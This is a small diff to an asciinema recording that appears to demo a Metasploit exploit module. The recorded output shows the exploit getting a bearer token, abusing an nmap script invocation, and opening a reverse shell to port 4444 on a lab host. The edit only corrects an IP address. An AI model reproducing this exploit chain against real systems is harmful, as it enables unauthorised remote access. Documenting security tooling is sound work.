@@ -150,7 +150,7 @@
 [39.247815, "o", "\u001b[1m\u001b[32m[+]\u001b[0m 10.10.10.213:8443 - and our nmap script file!\r\n"]
 [39.487503, "o", "\u001b[1m\u001b[32m[+]\u001b[0m 10.10.10.213:8443 - Bearer token 1b78100c-cf42-47fd-b64d-d36c07f1f934 obtained, wait for the final step where we invoke nmap...\r\n"]
 [39.788568, "o", "\u001b[1m\u001b[32m[+]\u001b[0m 10.10.10.213:8443 - Shell incoming!\r\n"]
-[40.06134, "o", "\u001b[1m\u001b[34m[*]\u001b[0m Command shell session 1 opened (10.10.10.1:4444 -> 10.9.8.213:56714) at 2020-04-21 15:05:48 +0700\r\n"]
+[40.06134, "o", "\u001b[1m\u001b[34m[*]\u001b[0m Command shell session 1 opened (10.10.10.1:4444 -> 10.10.10.213:56714) at 2020-04-21 15:05:48 +0700\r\n"]
 [40.169463, "o", "\r\n"]
 [40.169798, "o", "\u001b[0m"]
 [42.323212, "o", "i"]
